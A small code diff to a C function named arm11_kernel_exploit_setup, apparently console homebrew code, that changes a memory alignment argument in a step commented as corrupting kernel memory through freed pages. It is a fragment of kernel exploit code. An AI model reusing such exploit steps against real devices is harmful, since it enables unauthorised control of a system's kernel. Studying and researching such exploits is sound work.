@@ -112,7 +112,7 @@ int arm11_kernel_exploit_setup(void)
 
 	// part 1: corrupt kernel memory
 	// 0xFFFFFE0 is just stack memory for scratch space
-	unsigned int mem_hax_mem = linearMemAlign(0x10000, 0x10000);
+	unsigned int mem_hax_mem = linearMemAlign(0x10000, 0x2000);
 	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;
 	svcControlMemory(0xFFFFFE0, mem_hax_mem_free, 0, 0x1000, 1, 0); // free page 
 
